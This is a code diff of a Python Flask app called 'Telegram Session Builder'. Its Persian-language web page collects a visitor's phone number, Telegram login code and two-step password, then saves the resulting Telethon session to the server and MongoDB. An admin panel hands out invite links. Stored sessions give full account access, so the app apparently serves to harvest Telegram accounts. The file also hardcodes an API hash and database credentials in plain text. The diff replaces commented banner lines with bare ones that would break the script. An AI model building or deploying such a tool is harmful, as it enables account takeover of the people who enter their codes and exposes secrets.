@@ -1,19 +1,17 @@
-# ================================================================
+================================================================
 # Telegram Session Builder – FULL FINAL VERSION (ANTI SLEEP)
 # By: Tiam
-# ================================================================
+================================================================
 
-import os, asyncio, threading, secrets, time
+import os, asyncio, threading, secrets, time, shutil
 from flask import Flask, request, jsonify, render_template_string, redirect
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from pymongo import MongoClient
 from datetime import datetime
 import requests
-import shutil
 
 # ===================== CONFIG ===================================
-
 self_config = {
     "api_id": 24645053,
     "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
@@ -27,7 +25,6 @@ self_config = {
 os.makedirs(self_config["save_path"], exist_ok=True)
 
 # ===================== MongoDB ==================================
-
 mongo = MongoClient(
     "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
     "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
@@ -35,17 +32,14 @@ mongo = MongoClient(
     "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
     "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
 )
-
 db = mongo.telegram_sessions
 sessions_col = db.sessions
 links_col = db.links
 
 # ===================== Flask ====================================
-
-app = Flask(__name__)
+app = Flask(__name__, static_url_path='/static', static_folder='static')
 
 # ===================== Async Loop ================================
-
 loop = asyncio.new_event_loop()
 threading.Thread(
     target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()),
@@ -56,7 +50,6 @@ def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, loop).result()
 
 # ===================== Utils ====================================
-
 def gen_token():
     return secrets.token_urlsafe(8)
 
@@ -79,127 +72,123 @@ def normalize_phone(phone):
     return phone
 
 def delete_session(phone):
-    # پاک کردن فایل سشن
     path = os.path.join(self_config["save_path"], phone)
     if os.path.exists(path):
         shutil.rmtree(path)
-    # پاک کردن دیتابیس
     sessions_col.delete_one({"phone": phone})
 
 # ===================== HTML (USER) ===============================
-
 HTML_PAGE = """
-<!DOCTYPE html>
-<html lang="fa">
-<head>
-<meta charset="UTF-8">
-<title>Telegram Session Builder</title>
-<style>
-body { background:#0f172a;color:white;font-family:tahoma; }
-.box { width:360px;margin:120px auto;padding:25px;background:#0f172a;border-radius:16px;text-align:center; }
-input, button, select { width:95%; padding:12px;margin-top:10px;border-radius:10px;border:none; }
-button { background:#6366f1;color:white; }
-</style>
-</head>
-<body>
-<div class="box">
-<h3>ساخت سشن تلگرام</h3>
-
-<div id="s0" style="display:block">
-<select id="country" onchange="updateCode()">
-<option value="+98">ایران 🇮🇷</option>
-<option value="+90">ترکیه 🇹🇷</option>
-<option value="+1">آمریکا 🇺🇸</option>
-<option value="+44">انگلیس 🇬🇧</option>
-</select>
-</div>
-
-<div id="s1">
-<input id="phone" placeholder="شماره تلفن">
-<button onclick="checkPhone()">ادامه</button>
-</div>
-
-<div id="exists" style="display:none">
-<p>شما قبلاً ثبت نام کرده‌اید</p>
-<button onclick="deleteSession()">حذف سشن قبلی</button>
-</div>
-
-<div id="s2" style="display:none">
-<input id="code" placeholder="کد تلگرام">
-<button onclick="sendCode()">تأیید</button>
-</div>
-
-<div id="s3" style="display:none">
-<input id="password" type="password" placeholder="رمز دو مرحله‌ای">
-<button onclick="sendPassword()">تأیید</button>
-</div>
-
-<div id="done" style="display:none">
-<h3>✅ سشن ساخته شد</h3>
-</div>
-</div>
-
-<script>
-let phone="";
-
-function updateCode(){
-    let select = document.getElementById("country");
-    let p = document.getElementById("phone");
-    if(!p.value.startsWith("+")){
-        p.value = select.value;
-    }
+<!DOCTYPE html>  
+<html lang="fa">  
+<head>  
+<meta charset="UTF-8">  
+<title>Telegram Session Builder</title>  
+<style>  
+body { 
+    background: url('/static/astronomy-1867616_1280.jpg') no-repeat center center fixed;
+    background-size: cover;
+    color: white;
+    font-family: tahoma; 
 }
-
-function checkPhone(){
-    phone = document.getElementById("phone").value;
-    fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-    .then(r=>r.json()).then(d=>{
-        if(d.status=="exists"){document.getElementById("exists").style.display="block"; s1.style.display="none";}
-        if(d.status=="ok"){sendPhone();}
-    });
+.box { 
+    width:360px;
+    margin:120px auto;
+    padding:25px;
+    background: rgba(15, 23, 42, 0.85);
+    border-radius:16px;
+    text-align:center;
 }
+input, button, select { padding:12px;margin-top:10px;border-radius:10px;border:none; }
+button { background:#6366f1;color:white;width:100%; }
+select { width:80px; }
+#s0 { display:flex; gap:5px; margin-bottom:10px; }
+</style>  
+</head>  
+<body>  
+<div class="box">  
+<h3>ساخت سشن تلگرام</h3>  
+<div id="s0">  
+    <select id="country" onchange="updateCode()">  
+        <option value='+98'>ایران 🇮🇷</option>  
+        <option value='+90'>ترکیه 🇹🇷</option>  
+        <option value='+1'>آمریکا 🇺🇸</option>  
+        <option value='+44'>انگلیس 🇬🇧</option>  
+    </select>
+    <input id="phone" placeholder="شماره تلفن">  
+</div>  
+<button onclick="checkPhone()">دریافت کد</button>
 
-function deleteSession(){
-    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-    .then(r=>r.json()).then(d=>{
-        if(d.status=="ok"){alert("سشن قبلی حذف شد"); document.getElementById("exists").style.display="none"; s1.style.display="block";}
-    });
-}
+<div id="exists" style="display:none">  
+<p>شما قبلاً ثبت نام کرده‌اید</p>  
+<button onclick="deleteSession()">حذف سشن قبلی</button>  
+</div>  
 
-function sendPhone(){
-    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-    .then(r=>r.json()).then(d=>{
-        alert(d.message);
-        if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}
-    });
-}
+<div id="s2" style="display:none">  
+<input id="code" placeholder="کد تلگرام">  
+<button onclick="sendCode()">تأیید کد</button>  
+</div>  
 
-function sendCode(){
-    fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:code.value})})
-    .then(r=>r.json()).then(d=>{
-        if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}
-        if(d.status=="ok"){finish();}
-    });
-}
+<div id="s3" style="display:none">  
+<input id="password" type="password" placeholder="رمز دو مرحله‌ای">  
+<button onclick="sendPassword()">تأیید رمز</button>  
+</div>  
 
-function sendPassword(){
-    fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:password.value})})
-    .then(r=>r.json()).then(d=>{if(d.status=="ok")finish();});
-}
+<div id="done" style="display:none">  
+<h3>✅ سشن ساخته شد</h3>  
+</div>  
+</div>  
 
-function finish(){
-    s1.style.display=s2.style.display=s3.style.display="none";
-    done.style.display="block";
-}
-
-setInterval(()=>fetch("/ping"),240000);
-</script>
-</body>
+<script>  
+let phone="";  
+function updateCode(){  
+    let select = document.getElementById("country");  
+    let p = document.getElementById("phone");  
+    if(!p.value.startsWith("+")){ p.value = select.value; }  
+}  
+function checkPhone(){  
+    phone = document.getElementById("phone").value;  
+    fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})  
+    .then(r=>r.json()).then(d=>{  
+        if(d.status=="exists"){document.getElementById("exists").style.display="block"; s1.style.display="none";}  
+        if(d.status=="ok"){sendPhone();}  
+    });  
+}  
+function deleteSession(){  
+    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})  
+    .then(r=>r.json()).then(d=>{  
+        if(d.status=="ok"){alert("سشن قبلی حذف شد"); document.getElementById("exists").style.display="none"; s1.style.display="block";}  
+    });  
+}  
+function sendPhone(){  
+    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})  
+    .then(r=>r.json()).then(d=>{  
+        alert(d.message);  
+        if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}  
+    });  
+}  
+function sendCode(){  
+    fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:code.value})})  
+    .then(r=>r.json()).then(d=>{  
+        if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}  
+        if(d.status=="ok"){finish();}  
+    });  
+}  
+function sendPassword(){  
+    fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:password.value})})  
+    .then(r=>r.json()).then(d=>{if(d.status=="ok")finish();});  
+}  
+function finish(){  
+    s1.style.display=s2.style.display=s3.style.display="none";  
+    done.style.display="block";  
+}  
+setInterval(()=>fetch("/ping"),240000);  
+</script>  
+</body>  
 </html>
 """
 
 # ===================== Routes ===================================
-
 @app.route("/")
 def home():
     key = request.args.get("key")
@@ -210,8 +199,6 @@ def home():
 @app.route("/ping")
 def ping():
     return "OK"
-
-# ===================== Phone Check ==============================
 
 @app.route("/check_phone", methods=["POST"])
 def check_phone():
@@ -227,7 +214,6 @@ def delete_session_route():
     return jsonify(status="ok")
 
 # ===================== Telethon ================================
-
 clients = {}
 
 async def create_client(phone):
@@ -282,26 +268,36 @@ def send_password():
     return jsonify(status="ok")
 
 # ===================== Admin Panel ===============================
-
 ADMIN_HTML = """
-<!DOCTYPE html>
-<html lang="fa">
-<head>
-<meta charset="UTF-8">
-<title>Admin Panel</title>
-<style>body{background:#020617;color:white;font-family:tahoma} button{padding:6px 14px;border-radius:6px}</style>
-</head>
-<body>
-<h2>پنل ادمین</h2>
-<form method="post">
-<input name="max" type="number" placeholder="تعداد استفاده" required>
-<button>ساخت لینک</button>
-</form>
-<hr>
-{% for l in links %}
-<div>{{ l.token }} | {{ l.used }}/{{ l.max }}</div>
-{% endfor %}
-</body>
+<!DOCTYPE html>  
+<html lang="fa">  
+<head>  
+<meta charset="UTF-8">  
+<title>Admin Panel</title>  
+<style>
+body {background:#020617;color:white;font-family:tahoma}
+button {padding:6px 14px;border-radius:6px;margin-left:5px;}
+</style>
+</head>  
+<body>  
+<h2>پنل ادمین</h2>  
+<form method="post">  
+<input name="max" type="number" placeholder="تعداد استفاده" required>  
+<button>ساخت لینک</button>  
+</form>  
+<hr>  
+{% for l in links %}  
+<div>
+    {{ l.token }} | {{ l.used }}/{{ l.max }}
+    <button onclick="copyLink('{{ base_url }}/?key={{ l.token }}')">کپی لینک</button>
+</div>
+{% endfor %}  
+<script>
+function copyLink(url) {
+    navigator.clipboard.writeText(url).then(()=>{alert('لینک کپی شد: ' + url)});
+}
+</script>
+</body>  
 </html>
 """
 
@@ -325,7 +321,6 @@ def admin():
     )
 
 # ===================== KEEP ALIVE ================================
-
 def internal_ping():
     while True:
         try: requests.get(self_config["base_url"] + "/ping", timeout=10)
@@ -343,6 +338,5 @@ threading.Thread(target=internal_ping, daemon=True).start()
 threading.Thread(target=fake_bot_ping, daemon=True).start()
 
 # ===================== RUN ======================================
-
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
